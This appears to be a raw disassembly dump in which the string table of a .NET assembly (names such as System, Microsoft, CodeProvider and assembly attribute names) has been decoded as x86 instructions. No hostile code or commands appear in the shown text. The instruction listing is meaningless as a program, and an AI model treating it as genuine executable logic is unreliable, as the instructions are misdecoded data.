  4048f1:	gs je  0x40493c
  4048f4:	je     0x40496a
  4048f6:	jo     0x4048f8
  4048f8:	push   ebx
  4048f9:	jns    0x40496e
  4048fb:	je     0x404962
  4048fd:	ins    DWORD PTR es:[edi],dx
  4048fe:	dec    esi
  4048ff:	gs je  0x40494a
  404902:	je     0x404978
  404904:	jo     0x40495d
  404906:	bound  edx,QWORD PTR gs:[edx+0x65]
  40490a:	jno    0x404981
  40490c:	gs jae 0x404983
  40490f:	add    BYTE PTR [ebx+0x79],dl
  404912:	jae    0x404988
  404914:	gs ins DWORD PTR es:[edi],dx
  404916:	push   edx
  404917:	jne    0x404987
  404919:	je     0x404984
  40491b:	ins    DWORD PTR es:[edi],dx
  40491c:	gs push ebx
  40491e:	gs jb  0x40498a
  404921:	popa   
  404922:	ins    BYTE PTR es:[edi],dx
  404923:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  40492a:	inc    esi
  40492b:	outs   dx,DWORD PTR ds:[esi]
  40492c:	jb     0x40499b
  40492e:	popa   
  40492f:	je     0x4049a5
  404931:	gs jb  0x4049a7
  404934:	push   ebx
  404935:	outs   dx,DWORD PTR ds:[esi]
  404936:	popa   
  404937:	jo     0x404939
  404939:	push   ebx
  40493a:	jns    0x4049af
  40493c:	je     0x4049a3
  40493e:	ins    DWORD PTR es:[edi],dx
  40493f:	push   edx
  404940:	jne    0x4049b0
  404942:	je     0x4049ad
  404944:	ins    DWORD PTR es:[edi],dx
  404945:	gs push edi
  404947:	imul   ebp,DWORD PTR [esi+0x64],0x5273776f
  40494e:	jne    0x4049be
  404950:	je     0x4049bb
  404952:	ins    DWORD PTR es:[edi],dx
  404953:	add    BYTE PTR gs:[ebx+0x79],dl
  404957:	jae    0x4049cd
  404959:	gs ins DWORD PTR es:[edi],dx
  40495b:	push   edx
  40495c:	jne    0x4049cc
  40495e:	je     0x4049c9
  404960:	ins    DWORD PTR es:[edi],dx
  404961:	gs push edi
  404963:	imul   ebp,DWORD PTR [esi+0x64],0x5273776f
  40496a:	jne    0x4049da
  40496c:	je     0x4049d7
  40496e:	ins    DWORD PTR es:[edi],dx
  40496f:	gs push ebp
  404971:	dec    ecx
  404972:	pop    eax
  404973:	popa   
  404974:	ins    DWORD PTR es:[edi],dx
  404975:	ins    BYTE PTR es:[edi],dx
  404976:	add    BYTE PTR [ebx+0x79],dl
  404979:	jae    0x4049ef
  40497b:	gs ins DWORD PTR es:[edi],dx
  40497d:	push   ebx
  40497e:	arpl   WORD PTR gs:[ebp+0x72],si
  404982:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  40498a:	gs ins DWORD PTR es:[edi],dx
  40498c:	push   ebx
  40498d:	gs jb  0x404a06
  404990:	imul   esp,DWORD PTR [ebx+0x65],0x65646f4d
  404997:	ins    BYTE PTR es:[edi],dx
  404998:	push   edi
  404999:	bound  eax,QWORD PTR gs:[eax]
  40499c:	push   ebx
  40499d:	jns    0x404a12
  40499f:	je     0x404a06
  4049a1:	ins    DWORD PTR es:[edi],dx
  4049a2:	push   ebx
  4049a3:	gs jb  0x404a1c
  4049a6:	imul   esp,DWORD PTR [ebx+0x65],0x636f7250
  4049ad:	gs jae 0x404a23
  4049b0:	add    BYTE PTR [ebx+0x79],dl
  4049b3:	jae    0x404a29
  4049b5:	gs ins DWORD PTR es:[edi],dx
  4049b7:	push   edi
  4049b8:	bound  eax,QWORD PTR gs:[eax]
  4049bb:	push   ebx
  4049bc:	jns    0x404a31
  4049be:	je     0x404a25
  4049c0:	ins    DWORD PTR es:[edi],dx
  4049c1:	push   edi
  4049c2:	bound  eax,QWORD PTR gs:[ecx+0x62]
  4049c6:	jae    0x404a3c
  4049c8:	jb     0x404a2b
  4049ca:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4049ce:	outs   dx,BYTE PTR ds:[esi]
  4049cf:	jae    0x4049d1
  4049d1:	push   ebx
  4049d2:	jns    0x404a47
  4049d4:	je     0x404a3b
  4049d6:	ins    DWORD PTR es:[edi],dx
  4049d7:	push   edi
  4049d8:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  4049dd:	popa   
  4049de:	ins    DWORD PTR es:[edi],dx
  4049df:	imul   esp,DWORD PTR [ebx+0x44],0x617461
  4049e6:	push   ebx
  4049e7:	jns    0x404a5c
  4049e9:	je     0x404a50
  4049eb:	ins    DWORD PTR es:[edi],dx
  4049ec:	push   edi
  4049ed:	bound  eax,QWORD PTR gs:[ecx+edi*2+0x6e]
  4049f2:	popa   
  4049f3:	ins    DWORD PTR es:[edi],dx
  4049f4:	imul   esp,DWORD PTR [ebx+0x44],0x44617461
  4049fb:	gs jae 0x404a67
  4049fe:	outs   dx,BYTE PTR ds:[si]
  404a00:	add    BYTE PTR [ebx+0x79],dl
  404a03:	jae    0x404a79
  404a05:	gs ins DWORD PTR es:[edi],dx
  404a07:	push   edi
  404a08:	bound  eax,QWORD PTR gs:[ebp+0x6e]
  404a0c:	je     0x404a77
  404a0e:	je     0x404a89
  404a10:	inc    esp
  404a11:	gs jae 0x404a7d
  404a14:	outs   dx,BYTE PTR ds:[si]
  404a16:	add    BYTE PTR [ebx+0x79],dl
  404a19:	jae    0x404a8f
  404a1b:	gs ins DWORD PTR es:[edi],dx
  404a1d:	push   edi
  404a1e:	bound  eax,QWORD PTR gs:[ebp+0x78]
  404a22:	je     0x404a89
  404a24:	outs   dx,BYTE PTR ds:[esi]
  404a25:	jae    0x404a90
  404a27:	outs   dx,DWORD PTR ds:[esi]
  404a28:	outs   dx,BYTE PTR ds:[esi]
  404a29:	jae    0x404a2b
  404a2b:	push   ebx
  404a2c:	jns    0x404aa1
  404a2e:	je     0x404a95
  404a30:	ins    DWORD PTR es:[edi],dx
  404a31:	push   edi
  404a32:	bound  eax,QWORD PTR gs:[ebp+0x78]
  404a36:	je     0x404a9d
  404a38:	outs   dx,BYTE PTR ds:[esi]
  404a39:	jae    0x404aa4
  404a3b:	outs   dx,DWORD PTR ds:[esi]
  404a3c:	outs   dx,BYTE PTR ds:[esi]
  404a3d:	jae    0x404a83
  404a3f:	gs jae 0x404aab
  404a42:	outs   dx,BYTE PTR ds:[si]
  404a44:	add    BYTE PTR [ebx+0x79],dl
  404a47:	jae    0x404abd
  404a49:	gs ins DWORD PTR es:[edi],dx
  404a4b:	push   edi
  404a4c:	bound  ecx,QWORD PTR gs:[ebp+0x6f]
  404a50:	bound  ebp,QWORD PTR [ecx+0x6c]
  404a53:	add    BYTE PTR gs:[ebx+0x79],dl
  404a57:	jae    0x404acd
  404a59:	gs ins DWORD PTR es:[edi],dx
  404a5b:	push   edi
  404a5c:	bound  edx,QWORD PTR gs:[edx+0x65]
  404a60:	addr16 jne 0x404acf
  404a63:	popa   
  404a64:	jb     0x404aab
  404a66:	js     0x404ad8
  404a68:	jb     0x404acf
  404a6a:	jae    0x404adf
  404a6c:	imul   ebp,DWORD PTR [edi+0x6e],0x79530073
  404a73:	jae    0x404ae9
  404a75:	gs ins DWORD PTR es:[edi],dx
  404a77:	push   edi
  404a78:	bound  edx,QWORD PTR gs:[edx+0x6f]
  404a7c:	jne    0x404af2
  404a7e:	imul   ebp,DWORD PTR [esi+0x67],0x73795300
  404a85:	je     0x404aec
  404a87:	ins    DWORD PTR es:[edi],dx
  404a88:	push   edi
  404a89:	bound  edx,QWORD PTR gs:[ebx+0x65]
  404a8d:	jb     0x404b05
  404a8f:	imul   esp,DWORD PTR [ebx+0x65],0x69570073
  404a96:	outs   dx,BYTE PTR ds:[esi]
  404a97:	outs   dx,DWORD PTR fs:[esi]
  404a99:	ja     0x404b0e
  404a9b:	inc    edx
  404a9c:	popa   
  404a9d:	jae    0x404b04
  404a9f:	add    BYTE PTR [ebp+0x69],cl
  404aa2:	arpl   WORD PTR [edx+0x6f],si
  404aa5:	jae    0x404b16
  404aa7:	data16 je 0x404b00
  404aaa:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404ab1:	jne    0x404b17
  404ab3:	imul   ebp,DWORD PTR [edi+0x0],0x7263694d
  404aba:	outs   dx,DWORD PTR ds:[esi]
  404abb:	jae    0x404b2c
  404abd:	data16 je 0x404b16
  404ac0:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404ac7:	jne    0x404b2d
  404ac9:	imul   ebp,DWORD PTR [edi+0x57],0x6f646e69
  404ad0:	ja     0x404b45
  404ad2:	inc    esi
  404ad3:	outs   dx,DWORD PTR ds:[esi]
  404ad4:	jb     0x404b43
  404ad6:	jae    0x404ad8
  404ad8:	push   esi
  404ad9:	dec    edx
  404ada:	push   ebx
  404adb:	push   0x43707261
  404ae0:	outs   dx,DWORD PTR ds:[esi]
  404ae1:	fs gs push eax
  404ae4:	jb     0x404b55
  404ae6:	jbe    0x404b51
  404ae8:	fs gs jb 0x404aec
  404aec:	inc    ecx
  404aed:	push   ebx
  404aee:	push   eax
  404aef:	inc    edx
  404af0:	jb     0x404b61
  404af2:	ja     0x404b67
  404af4:	gs jb  0x404b3a
  404af7:	popa   
  404af8:	jo     0x404b6d
  404afa:	push   eax
  404afb:	jne    0x404b5f
  404afd:	ins    BYTE PTR es:[edi],dx
  404afe:	imul   esp,DWORD PTR [ebx+0x4b],0x41007965
  404b05:	push   ebx
  404b06:	push   eax
  404b07:	inc    edx
  404b08:	jb     0x404b79
  404b0a:	ja     0x404b7f
  404b0c:	gs jb  0x404b52
  404b0f:	popa   
  404b10:	jo     0x404b85
  404b12:	inc    esi
  404b13:	popa   
  404b14:	arpl   WORD PTR [edi+ebp*2+0x72],si
  404b18:	jns    0x404b1a
  404b1a:	dec    ebp
  404b1b:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404b22:	je     0x404b7a
  404b24:	push   ebx
  404b25:	inc    esp
  404b26:	gs jae 0x404b92
  404b29:	outs   dx,BYTE PTR ds:[si]
  404b2b:	gs jb  0x404b2e
  404b2e:	dec    ebp
  404b2f:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404b36:	je     0x404b8e
  404b38:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  404b3f:	jne    0x404ba5
  404b41:	imul   ebp,DWORD PTR [edi+0x57],0x4d006265
  404b48:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404b4f:	je     0x404ba8
  404b51:	bound  eax,QWORD PTR gs:[ebp+eiz*2+0x73]
  404b56:	imul   esp,DWORD PTR [edi+0x6e],0x63694d00
  404b5d:	jb     0x404bce
  404b5f:	jae    0x404bd0
  404b61:	data16 je 0x404bba
  404b64:	push   ebx
  404b65:	inc    esp
  404b66:	gs jae 0x404bd2
  404b69:	outs   dx,BYTE PTR ds:[si]
  404b6b:	gs jb  0x404bbb
  404b6e:	outs   dx,DWORD PTR ds:[esi]
  404b6f:	bound  ebp,QWORD PTR [ecx+0x6c]
  404b72:	add    BYTE PTR gs:[ebp+0x69],cl
  404b76:	arpl   WORD PTR [edx+0x6f],si
  404b79:	jae    0x404bea
  404b7b:	data16 je 0x404bc8
  404b7e:	push   ebx
  404b7f:	arpl   WORD PTR [edx+0x69],si
  404b82:	jo     0x404bf8
  404b84:	add    BYTE PTR [edx+0x65],dh
  404b87:	jo     0x404bf5
  404b89:	popa   
  404b8a:	arpl   WORD PTR [ebp+0x64],sp
  404b8d:	add    BYTE PTR [edi+0x65],ah
  404b90:	je     0x404bf1
  404b92:	inc    esp
  404b93:	gs jae 0x404bf9
  404b96:	jb     0x404c01
  404b98:	jo     0x404c0e
  404b9a:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  404ba1:	dec    esp
  404ba2:	outs   dx,DWORD PTR ds:[esi]
  404ba3:	arpl   WORD PTR [ecx+0x6c],sp
  404ba6:	imul   edi,DWORD PTR [edx+0x65],0x72745364
  404bad:	imul   ebp,DWORD PTR [esi+0x67],0x72657600
  404bb4:	jae    0x404c1f
  404bb6:	outs   dx,DWORD PTR ds:[esi]
  404bb7:	outs   dx,BYTE PTR ds:[esi]
  404bb8:	add    BYTE PTR [ecx+0x6e],ch
  404bbb:	jbe    0x404c1e
  404bbd:	ins    BYTE PTR es:[edi],dx
  404bbe:	imul   esp,DWORD PTR [ecx+eax*2+0x72],0x72724567
  404bc6:	add    BYTE PTR [esi+0x6f],ch
  404bc9:	inc    ebx
  404bca:	ins    BYTE PTR es:[edi],dx
  404bcb:	popa   
  404bcc:	jae    0x404c41
  404bce:	dec    esi
  404bcf:	popa   
  404bd0:	ins    DWORD PTR es:[edi],dx
  404bd1:	gs inc ebp
  404bd3:	jb     0x404c47
  404bd5:	add    BYTE PTR [ebx+0x6c],ah
  404bd8:	popa   
  404bd9:	jae    0x404c4e
  404bdb:	dec    esi
  404bdc:	outs   dx,DWORD PTR ds:[esi]
  404bdd:	je     0x404c25
  404bdf:	outs   dx,DWORD PTR ds:[esi]
  404be0:	jne    0x404c50
  404be2:	fs inc ebp
  404be4:	jb     0x404c58
  404be6:	add    BYTE PTR [edi+0x65],ah
  404be9:	outs   dx,BYTE PTR ds:[esi]
  404bea:	gs jb  0x404c4e
  404bed:	je     0x404c58
  404bef:	outs   dx,BYTE PTR ds:[esi]
  404bf0:	addr16 inc ebx
  404bf2:	ins    BYTE PTR es:[edi],dx
  404bf3:	popa   
  404bf4:	jae    0x404c69
  404bf6:	dec    esi
  404bf7:	popa   
  404bf8:	ins    DWORD PTR es:[edi],dx
  404bf9:	add    BYTE PTR gs:[ebx+0x6f],ah
  404bfd:	fs gs inc edi
  404c00:	outs   dx,BYTE PTR gs:[esi]
  404c02:	push   ebx
  404c03:	jne    0x404c68
  404c05:	arpl   WORD PTR [ebp+0x73],sp
  404c08:	jae    0x404c0a
  404c0a:	arpl   WORD PTR [edi+0x64],bp
  404c0d:	gs inc edi
  404c0f:	outs   dx,BYTE PTR gs:[esi]
  404c11:	inc    ebp
  404c12:	jb     0x404c86
  404c14:	add    BYTE PTR [edi+0x65],ah
  404c17:	outs   dx,BYTE PTR ds:[esi]
  404c18:	gs jb  0x404c84
  404c1b:	arpl   WORD PTR [ebp+0x72],ax
  404c1e:	jb     0x404c20
  404c20:	ja     0x404c8f
  404c22:	imul   ecx,DWORD PTR [esi+0x61],0x7053656d
  404c29:	popa   
  404c2a:	arpl   WORD PTR [ebp+0x0],sp
  404c2d:	arpl   WORD PTR [ecx+eiz*2+0x73],bp
  404c31:	jae    0x404c81
  404c33:	popa   
  404c34:	ins    DWORD PTR es:[edi],dx
  404c35:	gs push ebx
  404c37:	jo     0x404c9a
  404c39:	arpl   WORD PTR [ebp+0x0],sp
  404c3c:	outs   dx,BYTE PTR gs:[si]
  404c3f:	dec    esp
  404c40:	popa   
  404c41:	outs   dx,BYTE PTR ds:[esi]
  404c42:	addr16 jne 0x404ca6
  404c45:	add    BYTE PTR gs:[bp+di+0x73],ah
  404c4a:	dec    esp
  404c4b:	popa   
  404c4c:	outs   dx,BYTE PTR ds:[esi]
  404c4d:	add    BYTE PTR [bp+0x62],dh
  404c51:	dec    esp
  404c52:	popa   
  404c53:	outs   dx,BYTE PTR ds:[esi]
  404c54:	add    BYTE PTR [bp+si+0x73],ch
  404c58:	dec    esp
  404c59:	popa   
  404c5a:	outs   dx,BYTE PTR ds:[esi]
  404c5b:	add    BYTE PTR [bp+0x6a],dh
  404c5f:	dec    esp
  404c60:	popa   
  404c61:	outs   dx,BYTE PTR ds:[esi]
  404c62:	add    BYTE PTR [di+0x63],ch
  404c66:	dec    esp
  404c67:	popa   
  404c68:	outs   dx,BYTE PTR ds:[esi]
  404c69:	add    BYTE PTR [bp+0x69],ah
  404c6d:	ins    BYTE PTR es:[edi],dx
  404c6e:	gs push eax
  404c70:	popa   
  404c71:	je     0x404cdb
  404c73:	add    BYTE PTR [ebp+0x61],ch
  404c76:	arpl   WORD PTR [eax+0x69],bp
  404c79:	outs   dx,BYTE PTR ds:[esi]
  404c7a:	add    BYTE PTR gs:[ebp+0x73],dh
  404c7e:	gs jb  0x404c81
  404c81:	jae    0x404cfc
  404c83:	outs   dx,BYTE PTR ds:[esi]
  404c84:	je     0x404ce7
  404c86:	js     0x404cd0
  404c88:	gs ins BYTE PTR es:[edi],dx
  404c8a:	jo     0x404c8c
  404c8c:	gs js  0x404cf0
  404c8f:	ins    DWORD PTR es:[edi],dx
  404c90:	jo     0x404cfe
  404c92:	add    BYTE PTR gs:[ecx+0x6e],ch
  404c96:	jbe    0x404cf9
  404c98:	ins    BYTE PTR es:[edi],dx
  404c99:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x7245676e
  404ca1:	jb     0x404ca3
  404ca3:	je     0x404d14
  404ca5:	outs   dx,DWORD PTR ds:[esi]
  404ca6:	dec    esp
  404ca7:	outs   dx,DWORD PTR ds:[esi]
  404ca8:	outs   dx,BYTE PTR ds:[esi]
  404ca9:	addr16 inc esi
  404cab:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x45656d61
  404cb3:	jb     0x404d27
  404cb5:	add    BYTE PTR [ecx+0x6e],ch
  404cb8:	jbe    0x404d1b
  404cba:	ins    BYTE PTR es:[edi],dx
  404cbb:	imul   esp,DWORD PTR [esi+ecx*2+0x61],0x7073656d
  404cc3:	popa   
  404cc4:	arpl   WORD PTR [ebp+0x0],sp
  404cc7:	outs   dx,DWORD PTR ds:[esi]
  404cc8:	jo     0x404d3e
  404cca:	imul   ebp,DWORD PTR [edi+0x6e],0x6f6c0073
  404cd1:	popa   
  404cd2:	fs gs jb 0x404cd6
  404cd6:	jb     0x404d3d
  404cd8:	jae    0x404d49
  404cda:	jne    0x404d4e
  404cdc:	arpl   WORD PTR [ebp+0x73],sp
  404cdf:	add    BYTE PTR [edi+0x65],al
  404ce2:	je     0x404d30
  404ce4:	outs   dx,DWORD PTR ds:[esi]
  404ce5:	popa   
  404ce6:	fs gs jb 0x404cea
  404cea:	addr16 gs je 0x404d4d
  404cee:	inc    ebx
  404cef:	jne    0x404d5d
  404cf1:	je     0x404d68
  404cf3:	jb     0x404d5a
  404cf5:	add    BYTE PTR [edi+0x65],ah
  404cf8:	je     0x404d59
  404cfa:	push   edx
  404cfb:	gs jae 0x404d6d
  404cfe:	jne    0x404d72
  404d00:	arpl   WORD PTR [ebp+0x73],sp
  404d03:	add    BYTE PTR [edi+0x65],al
  404d06:	je     0x404d5b
  404d08:	je     0x404d7c
  404d0a:	imul   ebp,DWORD PTR [esi+0x67],0x74654700
  404d11:	dec    edi
  404d12:	bound  ebp,QWORD PTR [edx+0x65]
  404d15:	arpl   WORD PTR [eax+eax*1+0x43],si
  404d19:	jne    0x404d87
  404d1b:	je     0x404d92
  404d1d:	jb     0x404d84
  404d1f:	add    BYTE PTR [edx+0x65],dl
  404d22:	jae    0x404d93
  404d24:	jne    0x404d98
  404d26:	arpl   WORD PTR [ebp+0x73],sp
  404d29:	add    BYTE PTR [ecx+0x72],ah
  404d2c:	addr16 jae 0x404d2f
  404d2f:	dec    esp
  404d30:	popa   
  404d31:	outs   dx,BYTE PTR ds:[esi]
  404d32:	addr16 jne 0x404d96
  404d35:	add    BYTE PTR gs:[bp+0x69],al
  404d3a:	ins    BYTE PTR es:[edi],dx
  404d3b:	gs push eax
  404d3d:	popa   
  404d3e:	je     0x404da8
  404d40:	add    BYTE PTR [ecx+eiz*2+0x6e],ch
  404d44:	add    BYTE PTR [bp+di+0x79],dl
  404d48:	jae    0x404dbe
  404d4a:	gs ins DWORD PTR es:[edi],dx
  404d4c:	cs push edx
  404d4e:	jne    0x404dbe
  404d50:	je     0x404dbb
  404d52:	ins    DWORD PTR es:[edi],dx
  404d53:	gs cs dec ecx
  404d56:	outs   dx,BYTE PTR ds:[esi]
  404d57:	je     0x404dbe
  404d59:	jb     0x404dca
  404d5b:	jo     0x404db0
  404d5d:	gs jb  0x404dd6
  404d60:	imul   esp,DWORD PTR [ebx+0x65],0x754f0073
  404d67:	je     0x404daa
  404d69:	je     0x404ddf
  404d6b:	jb     0x404dd6
  404d6d:	bound  esi,QWORD PTR [ebp+0x74]
  404d70:	add    BYTE PTR gs:[ebx+0x6c],ah
  404d74:	jae    0x404d76
  404d76:	fs popa 
  404d78:	je     0x404ddb
  404d7a:	add    BYTE PTR [ebp+eiz*2+0x73],ah
  404d7e:	arpl   WORD PTR [edx+0x69],si
  404d81:	jo     0x404df7
  404d83:	imul   ebp,DWORD PTR [edi+0x6e],0x74616300
  404d8a:	outs   dx,DWORD PTR gs:[si]
  404d8d:	jb     0x404e08
  404d8f:	add    BYTE PTR [esi+0x61],dh
  404d92:	ins    BYTE PTR es:[edi],dx
  404d93:	jne    0x404dfa
  404d95:	add    BYTE PTR [esi+0x61],ch
  404d98:	ins    DWORD PTR es:[edi],dx
  404d99:	add    BYTE PTR gs:[eax+0x61],dl
  404d9d:	jb     0x404e00
  404d9f:	ins    DWORD PTR es:[edi],dx
  404da0:	inc    ecx
  404da1:	jb     0x404e15
  404da3:	popa   
  404da4:	jns    0x404de7
  404da6:	je     0x404e1c
  404da8:	jb     0x404e13
  404daa:	bound  esi,QWORD PTR [ebp+0x74]
  404dad:	add    BYTE PTR gs:[ebp+0x73],dh
  404db1:	gs fs inc esi
  404db4:	popa   
  404db5:	ins    BYTE PTR es:[edi],dx
  404db6:	ins    BYTE PTR es:[edi],dx
  404db7:	bound  esp,QWORD PTR [ecx+0x63]
  404dba:	imul   eax,DWORD PTR [eax],0x43
  404dbd:	outs   dx,DWORD PTR ds:[esi]
  404dbe:	ins    DWORD PTR es:[edi],dx
  404dbf:	push   esi
  404dc0:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  404dc7:	je     0x404e3d
  404dc9:	jb     0x404e34
  404dcb:	bound  esi,QWORD PTR [ebp+0x74]
  404dce:	add    BYTE PTR gs:[ebx+0x4c],al
  404dd2:	push   ebx
  404dd3:	inc    ebx
  404dd4:	outs   dx,DWORD PTR ds:[esi]
  404dd5:	ins    DWORD PTR es:[edi],dx
  404dd6:	jo     0x404e44
  404dd8:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  404ddf:	jb     0x404e4a
  404de1:	bound  esi,QWORD PTR [ebp+0x74]
  404de4:	add    BYTE PTR gs:[ebx+0x79],dl
  404de8:	jae    0x404e5e
  404dea:	gs ins DWORD PTR es:[edi],dx
  404dec:	cs push edx
  404dee:	gs data16 ins BYTE PTR es:[edi],dx
  404df1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  404df6:	outs   dx,BYTE PTR ds:[esi]
  404df7:	add    BYTE PTR [ecx+0x73],al
  404dfa:	jae    0x404e61
  404dfc:	ins    DWORD PTR es:[edi],dx
  404dfd:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  404e01:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  404e09:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404e10:	jae    0x404e85
  404e12:	gs ins DWORD PTR es:[edi],dx
  404e14:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  404e18:	gs jae 0x404e7e
  404e1b:	jb     0x404e86
  404e1d:	jo     0x404e93
  404e1f:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404e26:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404e2d:	jae    0x404ea2
  404e2f:	gs ins DWORD PTR es:[edi],dx
  404e31:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  404e35:	gs popaw 
  404e38:	jne    0x404ea6
  404e3a:	je     0x404e7d
  404e3c:	ins    BYTE PTR es:[edi],dx
  404e3d:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  404e44:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404e4b:	jae    0x404ec0
  404e4d:	gs ins DWORD PTR es:[edi],dx
  404e4f:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  404e53:	outs   dx,DWORD PTR ds:[esi]
  404e54:	ins    DWORD PTR es:[edi],dx
  404e55:	jo     0x404eb8
  404e57:	outs   dx,BYTE PTR ds:[esi]
  404e58:	jns    0x404e9b
  404e5a:	je     0x404ed0
  404e5c:	jb     0x404ec7
  404e5e:	bound  esi,QWORD PTR [ebp+0x74]
  404e61:	add    BYTE PTR gs:[ecx+0x73],al
  404e65:	jae    0x404ecc
  404e67:	ins    DWORD PTR es:[edi],dx
  404e68:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  404e6c:	jb     0x404edd
  404e6e:	fs jne 0x404ed4
  404e71:	je     0x404eb4
  404e73:	je     0x404ee9
  404e75:	jb     0x404ee0
  404e77:	bound  esi,QWORD PTR [ebp+0x74]
  404e7a:	add    BYTE PTR gs:[ecx+0x73],al
  404e7e:	jae    0x404ee5
  404e80:	ins    DWORD PTR es:[edi],dx
  404e81:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  404e85:	outs   dx,DWORD PTR ds:[esi]
  404e86:	jo     0x404f01
  404e88:	jb     0x404ef3
  404e8a:	addr16 push 0x74744174
  404e90:	jb     0x404efb
  404e92:	bound  esi,QWORD PTR [ebp+0x74]
  404e95:	add    BYTE PTR gs:[ecx+0x73],al
  404e99:	jae    0x404f00
  404e9b:	ins    DWORD PTR es:[edi],dx
  404e9c:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  404ea0:	gs jb  0x404f16
  404ea3:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404eaa:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404eb1:	jae    0x404f26
  404eb3:	gs ins DWORD PTR es:[edi],dx
  404eb5:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  404eb9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  404ec1:	outs   dx,DWORD PTR ds:[esi]
  404ec2:	outs   dx,BYTE PTR ds:[esi]
  404ec3:	inc    ecx
  404ec4:	je     0x404f3a
  404ec6:	jb     0x404f31
  404ec8:	bound  esi,QWORD PTR [ebp+0x74]
  404ecb:	add    BYTE PTR gs:[ecx+0x73],al
  404ecf:	jae    0x404f36
  404ed1:	ins    DWORD PTR es:[edi],dx
  404ed2:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  404ed6:	outs   dx,BYTE PTR ds:[esi]
  404ed7:	outs   dx,WORD PTR ds:[esi]
  404ed9:	jb     0x404f48
  404edb:	popa   
  404edc:	je     0x404f47
  404ede:	outs   dx,DWORD PTR ds:[esi]
  404edf:	outs   dx,BYTE PTR ds:[esi]
  404ee0:	popa   
  404ee1:	ins    BYTE PTR es:[edi],dx
  404ee2:	push   esi
  404ee3:	gs jb  0x404f59
  404ee6:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404eed:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  404ef4:	popa   
  404ef5:	je     0x404f5c
  404ef7:	ins    BYTE PTR es:[edi],dx
  404ef8:	ins    BYTE PTR es:[edi],dx
  404ef9:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  404f01:	popa   
  404f02:	arpl   WORD PTR [esi+edx*2+0x65],si
  404f06:	jb     0x404f7b
  404f08:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  404f0f:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  404f16:	gs jne 0x404f8d
  404f19:	jb     0x404f7c
  404f1b:	ins    BYTE PTR es:[edi],dx
  404f1c:	push   edx
  404f1d:	gs jae 0x404f8f
  404f20:	jne    0x404f94
  404f22:	arpl   WORD PTR [ebp+0x73],sp
  404f25:	dec    esp
  404f26:	popa   
  404f27:	outs   dx,BYTE PTR ds:[esi]
  404f28:	addr16 jne 0x404f8c
  404f2b:	addr16 gs inc ecx
  404f2e:	je     0x404fa4
  404f30:	jb     0x404f9b
  404f32:	bound  esi,QWORD PTR [ebp+0x74]
  404f35:	add    BYTE PTR gs:[ecx+0x73],al
  404f39:	jae    0x404fa0
  404f3b:	ins    DWORD PTR es:[edi],dx
  404f3c:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  404f40:	gs ins BYTE PTR es:[edi],dx
  404f42:	popa   
  404f43:	jns    0x404f98
  404f45:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  404f4c:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  404f53:	jae    0x404fc8
  404f55:	gs ins DWORD PTR es:[edi],dx
  404f57:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  404f5b:	gs jns 0x404fa4
  404f5e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  404f66:	bound  esi,QWORD PTR [ebp+0x74]
  404f69:	add    BYTE PTR gs:[ecx+0x73],al
  404f6d:	jae    0x404fd4
  404f6f:	ins    DWORD PTR es:[edi],dx
  404f70:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  404f74:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  404f7b:	gs dec ebx
  404f7d:	gs jns 0x404fc1
  404f80:	je     0x404ff6
  404f82:	jb     0x404fed
  404f84:	bound  esi,QWORD PTR [ebp+0x74]
  404f87:	add    BYTE PTR gs:[ebx+0x79],dl
  404f8b:	jae    0x405001
  404f8d:	gs ins DWORD PTR es:[edi],dx
  404f8f:	cs push edx
  404f91:	jne    0x405001
  404f93:	je     0x404ffe
  404f95:	ins    DWORD PTR es:[edi],dx
  404f96:	gs cs inc ebx
  404f99:	outs   dx,DWORD PTR ds:[esi]
  404f9a:	ins    DWORD PTR es:[edi],dx
  404f9b:	jo     0x405006
  404f9d:	ins    BYTE PTR es:[edi],dx
  404f9e:	gs jb  0x404ff4
  404fa1:	gs jb  0x40501a
  404fa4:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  404fab:	outs   dx,BYTE PTR ds:[esi]
  404fac:	je     0x405017
  404fae:	ins    DWORD PTR es:[edi],dx
  404faf:	gs inc ebx
